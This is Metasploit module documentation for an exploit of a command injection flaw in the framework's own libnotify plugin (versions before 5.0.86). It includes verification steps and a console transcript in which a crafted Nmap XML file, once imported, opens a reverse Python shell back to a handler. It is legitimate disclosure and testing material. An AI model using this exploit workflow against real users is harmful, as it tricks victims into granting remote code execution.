## Vulnerable Application

Metasploit Framework versions prior to 5.0.86 are vulnerable to a command
injection vulnerability in the default `libnotify` plugin. The `libnotify`
plugin fails to properly parse the argument array to an executed operating
system command. If an attacker can convince a user running an affected version
of the Metasploit Framework with the `libnotify` plugin loaded to import a
specially crafted data file with `db_import`, they can execute a command within
the context of the user running Metasploit.

In order to trigger the vulnerable code path, the service reported must be
unique. This means that when the exploit file is loaded, it will not trigger the
vulnerability again unless the service is removed. The easiest way to remove the
service is to delete all services from the database using the `services -d`
command.

## Verification Steps

  Example steps in this format (is also in the PR):

  1. Install the application
  2. Start msfconsole
  3. Do: `use exploit/unix/fileformat/metasploit_libnotify_cmd_injection`
  4. Set options as appropriate
  5. Do: `exploit`
  6. Start a payload handler using `exploit/multi/handler`
  7. Transfer the file to the intended target and convince them to open it

## Scenarios

### Metasploit Framework v5.0.76


```
msf5 > use exploit/unix/fileformat/metasploit_libnotify_cmd_injection 
msf5 exploit(unix/fileformat/metasploit_libnotify_cmd_injection) > show options 

Module options (exploit/unix/fileformat/metasploit_libnotify_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  scan.xml         no        The file to write.


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.159.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.

   **DisablePayloadHandler: True   (RHOST and RPORT settings will be ignored!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/fileformat/metasploit_libnotify_cmd_injection) > exploit

[*] Writing xml file: scan.xml
[+] scan.xml stored at /home/smcintyre/.msf4/local/scan.xml
msf5 exploit(unix/fileformat/metasploit_libnotify_cmd_injection) > use exploit/multi/handler 
msf5 exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.159.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444 
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.159.128:4444 
msf5 exploit(multi/handler) > version
Framework: 5.0.76-dev-50cfb07cff
Console  : 5.0.76-dev-50cfb07cff
msf5 exploit(multi/handler) > load libnotify
[*] Successfully loaded plugin: libnotify
msf5 exploit(multi/handler) > services -d
Services
========

host  port  proto  name  state  info
----  ----  -----  ----  -----  ----

msf5 exploit(multi/handler) > db_import /home/smcintyre/.msf4/local/scan.xml
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.8'
[*] Importing host 192.168.20.121
sh: line 1: State:: command not found
sh: line 2: Proto:: command not found
sh: -c: line 3: unexpected EOF while looking for matching `''
sh: -c: line 4: syntax error: unexpected end of file
[*] Successfully imported /home/smcintyre/.msf4/local/scan.xml
msf5 exploit(multi/handler) > [*] Command shell session 4 opened (192.168.159.128:4444 -> 192.168.159.128:35516) at 2020-04-16 14:54:39 -0400

msf5 exploit(multi/handler) > sessions -i 4
[*] Starting interaction with 4...

id
uid=1000(smcintyre) gid=1000(smcintyre) groups=1000(smcintyre),10(wheel),974(wireshark),975(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
